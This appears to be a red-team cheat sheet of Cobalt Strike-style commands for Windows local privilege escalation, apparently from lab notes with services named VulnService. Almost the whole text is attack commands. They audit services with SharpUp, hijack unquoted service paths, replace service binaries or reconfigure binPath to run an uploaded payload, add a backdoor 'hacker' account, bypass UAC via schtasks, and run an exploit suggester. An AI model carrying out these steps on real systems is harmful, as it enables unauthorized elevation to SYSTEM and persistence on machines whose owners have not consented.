### SharpUp (https://github.com/GhostPack/SharpUp)
```
execute-assembly /root/SharpUp.exe audit
execute-assembly /root/SharpUp.exe audit UnquotedServicePath
execute-assembly /root/SharpUp.exe audit ModifiableServices
execute-assembly /root/SharpUp.exe audit ModifiableServiceBinaries
```

### Unquoted Service Paths
```
run wmic service get name,pathname
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
upload C:\Payloads\tcp-local_x64.svc.exe "C:\Program Files\Vulnerable Services\Service.exe"
run sc stop VulnService1
run sc start VulnService1
run sc query VulnService1
```

### Weak Service Permissions
https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
```
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
run sc qc VulnService2
upload C:\Payloads\tcp-local_x64.svc.exe C:\Temp\tcp-local_x64.svc.exe
run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
```

### Weak Service Binary Permissions
```
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
run sc stop VulnService3
upload C:\Payloads\tcp-local_x64.svc.exe "C:\Program Files\Vulnerable Services\Service 3.exe"
run sc start VulnService3
```

### UAC Bypasses
```
run net user hacker Passw0rd! /add
run whoami /groups
elevate uac-schtasks tcp-local
```

### Local Exploit Suggester
```
systeminfo > system.info
pip2 install xlrd==1.1.0
./windows-exploit-suggester.py -d 2023-01-21-mssb.xls -i system.info
```
